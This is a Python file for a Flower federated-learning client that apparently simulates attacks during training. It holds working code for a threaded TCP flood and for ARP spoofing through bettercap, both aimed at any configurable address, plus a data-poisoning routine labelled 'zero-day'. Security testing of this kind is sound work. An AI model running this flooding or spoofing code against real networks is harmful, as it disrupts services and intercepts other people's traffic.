import flwr as fl
import torch
import numpy as np
import subprocess
import os
import random
import socket
import threading
import time

class AttackSimulatorClient(fl.client.NumPyClient):
    def __init__(self, model, train_loader, attack_type=None, attack_params=None):
        self.model = model
        self.train_loader = train_loader
        self.attack_type = attack_type
        self.attack_params = attack_params or {}

    def get_parameters(self, config):
        return [val.cpu().numpy() for val in self.model.state_dict().values()]

    def set_parameters(self, parameters):
        self.model.load_state_dict({k: torch.tensor(v) for k, v in zip(self.model.state_dict().keys(), parameters)})

    def fit(self, parameters, config):
        self.set_parameters(parameters)
        attack_metric = {}
        if self.attack_type == "ddos":
            self.simulate_ddos()
            attack_metric["attack_type"] = "ddos"
        elif self.attack_type == "mitm":
            self.simulate_mitm()
            attack_metric["attack_type"] = "mitm"
        elif self.attack_type == "zero-day":
            self.simulate_zero_day()
            attack_metric["attack_type"] = "zero-day"
        else:
            attack_metric["attack_type"] = "none"

        # Normal training (could be replaced with malicious logic if desired)
        self.model.train()
        optimizer = torch.optim.Adam(self.model.parameters(), lr=0.001)
        criterion = torch.nn.CrossEntropyLoss()
        for x, y in self.train_loader:
            optimizer.zero_grad()
            loss = criterion(self.model(x), y)
            loss.backward()
            optimizer.step()
        return self.get_parameters(config), len(self.train_loader.dataset), attack_metric

    def evaluate(self, parameters, config):
        self.set_parameters(parameters)
        return 0.0, len(self.train_loader.dataset), {"attack_type": self.attack_type or "none"}

    def simulate_ddos(self):
        target_ip = self.attack_params.get("target_ip", "127.0.0.1")
        target_port = int(self.attack_params.get("target_port", 8080))
        num_threads = self.attack_params.get("num_threads", 10)
        duration = self.attack_params.get("duration", 5)  # Duration in seconds
        
        def flood():
            try:
                while time.time() < self.end_time:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        s.connect((target_ip, target_port))
                        # Send malformed HTTP request
                        s.send(b"GET / HTTP/1.1\r\n" * 1000)
                        s.close()
                    except:
                        pass
            except Exception as e:
                print(f"[AttackSimulator] DDoS thread error: {e}")

        try:
            print(f"[AttackSimulator] Starting DDoS simulation with {num_threads} threads for {duration}s...")
            self.end_time = time.time() + duration
            threads = []
            for _ in range(num_threads):
                t = threading.Thread(target=flood)
                t.daemon = True
                threads.append(t)
                t.start()

            # Wait for duration
            time.sleep(duration)
            print("[AttackSimulator] DDoS simulation completed")

        except Exception as e:
            print(f"[AttackSimulator] DDoS simulation failed: {e}")

    def simulate_mitm(self):
        target_ip = self.attack_params.get("target_ip", "127.0.0.1")
        gateway_ip = self.attack_params.get("gateway_ip", "192.168.1.1")
        iface = self.attack_params.get("iface", "eth0")
        try:
            print("[AttackSimulator] Simulating MitM attack...")
            subprocess.Popen([
                "bettercap",
                "-iface", iface,
                "-eval", f"set arp.spoof.targets {target_ip}; set arp.spoof.gateway {gateway_ip}; arp.spoof on"
            ])
        except Exception as e:
            print(f"[AttackSimulator] MitM simulation failed: {e}")

    def simulate_zero_day(self):
        # Mutate a portion of the training data
        print("[AttackSimulator] Simulating Zero-Day attack (payload mutation)...")
        for x, y in self.train_loader:
            idx = np.random.choice(len(x), size=int(0.1 * len(x)), replace=False)
            x[idx] += np.random.normal(0, 0.5, x[idx].shape)
            flip_idx = np.random.choice(len(y), size=int(0.05 * len(y)), replace=False)
            y[flip_idx] = torch.randint(0, torch.max(y)+1, (len(flip_idx),))
